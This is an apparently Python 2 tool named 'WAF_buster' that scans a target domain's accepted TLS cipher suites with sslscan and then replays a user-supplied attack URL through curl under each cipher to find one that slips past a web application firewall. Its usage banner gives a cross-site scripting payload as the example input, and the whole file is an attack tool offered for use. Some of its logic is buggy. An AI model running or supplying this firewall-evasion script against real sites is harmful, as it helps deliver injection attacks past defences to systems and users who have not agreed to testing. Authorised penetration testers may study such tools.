#!/usr/bin/python2
import sys
import subprocess
import requests as re
import os

g = 0

def banner():
	print "[1]Please Enter the Domain name on which WAF is set Up......"
	print "[2]Plese enter the second parameter as payload URL ......"
	print "[*]For eg:- ./WAF_buster.py abc.com abc.com/<script>alert(9)</script> //Please Mention http or https//....."
	print "[*]Run this script only if the Payload_URL is getting blocked by firewall "
def check_response():
	global g
	f=re.get(sys.argv[1], verify=False)
	g=f.status_code
	print g
def ssl_check(domain,payload):
	os.system('touch file.txt')
	file1=subprocess.Popen(["sslscan","--no-colour",domain],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	output1,error1=file1.communicate()
	open_file=open("file.txt",'w')
	open_file.write(output1)
	open_file.close()
	file_open=open("file.txt",'r')
	os.system('touch cipher.txt')
	file_write=open("cipher.txt",'w')
	for line in file_open.readlines():
		if "Accepted" in line or "Preferred" in line:
			file_write.write(line)
		else:
			continue
        file_write.close()
	file_open.close()

	fi=open("final_cipher.txt",'w')
	fm=open("cipher.txt",'r')
	for line in fm.readlines():
		split_line=line.split()
		if len(split_line)>=4:
			fi.write(split_line[4]+"\n")
		else:
			print "file Incomplete"
	fm.close()
	fi.close()

	try:
		cipher_open=open("final_cipher.txt",'r')
		for i in cipher_open.readlines():
			file2=subprocess.Popen(["curl","--ciphers",i,payload],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			output2,error2=file2.communicate()
#			if g in output2:
#				print "Firewall blocked Cipher %s" %i
#			elif payload in output2:
			if payload in output2:
				print "Firewall Bypassed using Cipher :%s and attack executed" %i
			else:
				print "Firewall Bypassed using Cipher %s but attack blocked" %i
		cipher_open.close()
	except Exception as ex:
		print ex
	
def main():
	if len(sys.argv)<3:
		banner()
	else:
		domain=sys.argv[1]
		payload=sys.argv[2]
		check_response()
		ssl_check(domain,payload)

if __name__== "__main__":
	 main()
